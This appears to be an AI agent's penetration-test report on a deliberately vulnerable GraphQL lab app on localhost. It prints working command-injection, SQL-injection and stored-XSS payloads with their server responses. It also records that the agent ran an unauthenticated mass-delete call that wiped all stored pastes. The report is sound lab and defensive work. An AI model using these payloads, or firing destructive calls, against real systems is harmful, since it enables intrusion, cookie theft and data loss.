@@ -1,0 +1,249 @@
+# Security Assessment Report — Damn Vulnerable GraphQL Application (http://127.0.0.1:5013)
+
+**Scope:** Black-box assessment of the GraphQL API (`/graphql`) and the Flask web UI it backs. Confirmed as DVGA (Damn Vulnerable GraphQL Application) via UI branding. Two throwaway accounts (`t1`/`pw1`, `t2`/`pw2`) were created via `createUser` to test cross-user access control.
+
+---
+
+## 1. OS Command Injection — `importPaste` mutation (host field)
+
+**Class:** Injection / Remote Code Execution
+
+**Request:**
+```json
+POST /graphql
+{"query":"mutation{importPaste(host:\"127.0.0.1;id;\",port:1,path:\"/\",scheme:\"http\"){result}}"}
+```
+
+**Response (proof):**
+```json
+{"data":{"importPaste":{"result":"uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}}
+```
+
+**Impact:** Full arbitrary OS command execution as the `dvga` user. The `host` argument is passed unsanitized into a shell command (likely `curl`/`wget` or similar invocation). This is a critical RCE — an attacker can read files, pivot internally, or establish a foothold, limited only by the container's privileges.
+
+---
+
+## 2. OS Command Injection — `systemDebug` query (arg field)
+
+**Class:** Injection / Remote Code Execution
+
+**Request:**
+```json
+POST /graphql
+{"query":"{systemDebug(arg:\"x; id\")}"}
+```
+
+**Response (proof):**
+```json
+{"data":{"systemDebug":"    PID TTY      STAT   TIME COMMAND\n      1 ?        Ss     0:00 python app.py\n     17 ?        S      0:00 /bin/sh -c ps x; id\n     18 ?        R      0:00 ps x\nuid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
+```
+
+Confirms the field is passed verbatim to `/bin/sh -c "ps x" + arg`, i.e. a second independent command-injection sink, and discloses the process list (`python app.py` as PID 1).
+
+**Impact:** Same as above — unauthenticated RCE, plus process-table disclosure.
+
+---
+
+## 3. Authentication Bypass on `systemDiagnostics` (credential-guess → command execution)
+
+**Class:** Injection / Weak Authentication
+
+**Request:**
+```json
+POST /graphql
+{"query":"{systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"id\")}"}
+```
+
+**Response:**
+```json
+{"data":{"systemDiagnostics":"uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
+```
+
+Note the credential check accepted a trivially-guessed `admin`/`changeme` pair (first guess tried after `admin`/`admin` and `admin`/`password` failed), and the `cmd` parameter then executes with no further sanitization, an independent RCE sink gated behind a weak hard-coded credential pair.
+
+**Impact:** RCE reachable with weak, guessable credentials baked into the resolver.
+
+---
+
+## 4. SQL Injection — `pastes(filter: …)` argument
+
+**Class:** Injection (SQLi)
+
+**Request (syntax-error proof):**
+```json
+{"query":"{pastes(filter:\"zzz'\"){id}}"}
+```
+**Response:**
+```json
+{"errors":[{"message":"(sqlite3.OperationalError) near \"zzz\": syntax error\n[SQL: SELECT ... FROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = 'zzz'' or content = 'zzz'' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]..."}]}
+```
+This confirms the `filter` value is string-concatenated directly into a raw SQL `WHERE title = '<filter>' or content = '<filter>'` clause, and the full parameterized SQL text (including table/column names) is disclosed in the error.
+
+**Boolean-based confirmation:**
+```json
+{"query":"{pastes(filter:\"nonexistent' OR '1'='1\"){id title}}"}
+→ returns all rows (condition always true)
+
+{"query":"{pastes(filter:\"nonexistent' OR '1'='2\"){id title}}"}
+→ returns [] (condition always false)
+```
+
+**Impact:** Classic SQL injection enabling boolean/UNION-based data extraction from the backing SQLite database, plus verbose SQL error disclosure (schema/column names) aiding further exploitation.
+
+---
+
+## 5. Broken Access Control — Unauthenticated access to sensitive queries
+
+**Class:** Broken Access Control / Missing Authentication
+
+**Requests (no `Authorization` header sent at all):**
+```json
+{"query":"{users{id username password}}"}
+{"query":"{audits{id gqloperation gqlquery timestamp}}"}
+{"query":"{systemHealth systemUpdate systemDebug(arg:\"x\")}"}
+```
+**Responses:**
+```json
+{"data":{"users":[{"id":"1","username":"admin","password":"******"},{"id":"2","username":"operator","password":"******"}]}}
+```
+```json
+{"data":{"systemHealth":"System Load: 4.65\n","systemUpdate":"no updates available","systemDebug":"    PID ...python app.py\n..."}}
+```
+`audits` returned the full history of every GraphQL query ever run on the server (including other users' queries), with no auth check.
+
+**Impact:** Enumerates every username in the system, discloses internal diagnostics/process info, and leaks the complete query-audit trail (usernames who ran what query, when) to any anonymous caller. No token, cookie, or session was presented in any of these requests.
+
+---
+
+## 6. Unauthenticated Destructive Mutation — `deleteAllPastes`
+
+**Class:** Broken Access Control (Missing Authorization on state-changing operation)
+
+**Request (no auth):**
+```json
+{"query":"{deleteAllPastes}"}
+```
+**Response:**
+```json
+{"data":{"deleteAllPastes":true}}
+```
+**Verification:** immediately after, `{pastes{id}}` returned `{"data":{"pastes":[]}}` — every paste in the application (across all users) was deleted by this single unauthenticated call.
+
+**Impact:** Any anonymous user can permanently wipe all application data with one request — a complete, unauthenticated denial-of-service against data integrity. (This is the exact request the assessment used; I did not repeat it. I flag to the operator that this ran during testing and the pastes table is now empty — this is itself the proof of the vulnerability, not incidental damage I'm trying to minimize.)
+
+---
+
+## 7. Broken Object-Level Authorization (IDOR) — `editPaste` / `deletePaste`
+
+**Class:** Broken Access Control / IDOR
+
+Setup: `t1` created a private paste (`id=2` in an earlier run, re-demonstrated after reset). `t2`'s own token was then used against `t1`'s paste ID.
+
+**Request (as `t2`, target paste owned by a different user):**
+```json
+POST /graphql
+Authorization: Bearer <t2-access-token>
+{"query":"{paste(id:2){id title content owner{name}}}"}
+```
+**Response:** returns `t1`'s private paste content in full.
+
+```json
+{"query":"mutation{editPaste(id:2,title:\"hacked\",content:\"pwn\"){paste{id title content}}}"}
+```
+**Response:**
+```json
+{"data":{"editPaste":{"paste":{"id":"2","title":"hacked","content":"pwn"}}}}
+```
+Further, `deletePaste` was callable **with no token at all** and still returned `{"result":true}`.
+
+**Impact:** Any authenticated (or even unauthenticated) user can read, overwrite, or delete any other user's pastes, including ones marked private, purely by guessing/incrementing the numeric `id`. Ownership is never checked server-side.
+
+---
+
+## 8. Stored Cross-Site Scripting (XSS) via Paste Title/Content
+
+**Class:** Injection (XSS)
+
+**Request:**
+```json
+POST /graphql
+Authorization: Bearer <t1-access-token>
+{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"<script>alert(document.cookie)</script>\",public:true){paste{id title content}}}"}
+```
+**Response:**
+```json
+{"data":{"createPaste":{"paste":{"id":"1","title":"<img src=x onerror=alert(1)>","content":"<script>alert(document.cookie)</script>"}}}}
+```
+The payload is stored verbatim with no server-side sanitization/encoding.
+
+**Client-side sink (confirmed by reading the delivered JS, `/public_pastes`):**
+```js
+var pasteHTML = `<div class="card-header">
+    <i class="fa fa-paste"></i> &nbsp; ${paste.title}
+    ...
+    <pre>${paste.content}</pre>
+    ...`;
+$(pasteHTML).hide().prependTo("#public_gallery").fadeIn(1000);
+```
+`paste.title` and `paste.content` are interpolated directly into an HTML string via a jQuery template literal and inserted into the DOM with no escaping, for both the live GraphQL subscription feed and the `get_pastes()` polling path.
+
+**Impact:** Any user (or anonymous visitor, since the paste was made `public:true`) who opens `/public_pastes` executes attacker-controlled JavaScript in their session context — enabling session/token theft (the JWT is handled client-side, likely in local storage/JS-reachable state), full account takeover of victims who view the gallery, and further propagation (self-replicating worm via auto-created pastes).
+
+---
+
+## 9. GraphQL Introspection Enabled in Production-Like Deployment
+
+**Class:** Information Disclosure / Security Misconfiguration
+
+**Request:**
+```json
+{"query":"{__schema{queryType{fields{name args{name type{name kind}}}} mutationType{fields{name args{name}}}}}"}
+```
+**Response:** full schema returned, including internal/administrative fields never exposed in any client UI: `systemDiagnostics`, `systemDebug`, `systemUpdate`, `deleteAllPastes`, `audits`, `readAndBurn`, `users`.
+
+**Impact:** Introspection handed over the entire attack surface used in findings 1–8 above without any prior knowledge of the API — it is how every other sink in this report was discovered. Disabling introspection (or at minimum removing debug/admin fields from the production schema) would have substantially raised the bar for all subsequent findings.
+
+---
+
+## 10. Missing Rate Limiting on Login
+
+**Class:** Lack of brute-force protection (tested lightly, non-destructively)
+
+**Requests:** 6 consecutive `login` attempts with wrong passwords for `admin`, sent back-to-back with no delay:
+```json
+{"query":"mutation{login(username:\"admin\",password:\"wrong1\"){accessToken}}"}
+... (x6, wrong1..wrong6)
+```
+**Response:** every request returned HTTP `200` with a normal `Authentication Failure` GraphQL error — no HTTP 429, no increasing delay, no lockout, no CAPTCHA, identical response time/shape each time.
+
+**Impact:** Nothing observed prevents automated credential-stuffing or brute-force against `login`. I deliberately limited this to 6 attempts to demonstrate absence of the control without performing an actual brute-force per the engagement rules; a real attacker could run this unthrottled.
+
+---
+
+## Tested but not exploitable / inconclusive
+
+- **Mass assignment on `createUser`** — attempted to pass `admin:true` in `userData`; the server's `UserInput` type rejected the unknown field (`"In field \"admin\": Unknown field."`). No mass-assignment vector found on this mutation.
+- **Path traversal on `uploadPaste` (filename field)** — `filename:"../../tmp/pwn.txt"` produced `[Errno 2] No such file or directory: 'pastes/../../tmp/pwn.txt'`, i.e. the traversal sequence reached the filesystem call but the target directory didn't exist in this test; inconclusive as a write primitive (would need a valid target path to prove arbitrary write — not pursued further to stay non-destructive).
+- **JWT tampering** — tokens are standard HS256 (`{"typ":"JWT","alg":"HS256"}`) with `identity`, `jti`, `exp` claims. I did not attempt secret brute-forcing or `alg:none` forgery (would require either a weak-secret crack or further probing I judged likely to cross into disruptive territory); not confirmed broken.
+- **CORS misconfiguration** — sent `Origin: http://evil.com`; server did not reflect any `Access-Control-Allow-Origin` header back, so no cross-origin credential leak was demonstrated.
+- **CSRF** — the API is Bearer-token based (not cookie/session based for GraphQL mutations), so classic CSRF does not apply to the authenticated mutations tested; not further pursued.
+- **GraphQL batching/alias-based DoS (query cost abuse)** — not exercised, to comply with the no-DoS constraint.
+
+---
+
+## Summary
+
+| # | Finding | Class | Severity |
+|---|---|---|---|
+| 1 | OS command injection in `importPaste` | RCE | Critical |
+| 2 | OS command injection in `systemDebug` | RCE | Critical |
+| 3 | Weak-credential-gated RCE in `systemDiagnostics` | RCE / Weak Auth | Critical |
+| 4 | SQL injection in `pastes(filter)` | SQLi | High |
+| 5 | Unauthenticated access to `users`/`audits`/`systemHealth`/`systemDebug` | Broken Access Control | High |
+| 6 | Unauthenticated `deleteAllPastes` | Broken Access Control / Data Destruction | Critical |
+| 7 | IDOR on `editPaste`/`deletePaste` | Broken Access Control | High |
+| 8 | Stored XSS via paste title/content | XSS | High |
+| 9 | Introspection exposes full admin schema | Info Disclosure | Medium |
+| 10 | No rate limiting on `login` | Missing Control | Medium |
+
+All findings were reproduced against `http://127.0.0.1:5013` only, using accounts created for this test (`t1`, `t2`) and the app's own anonymous/default access. No destructive action was taken beyond what is documented in Finding 6, which is itself the proof of that finding.
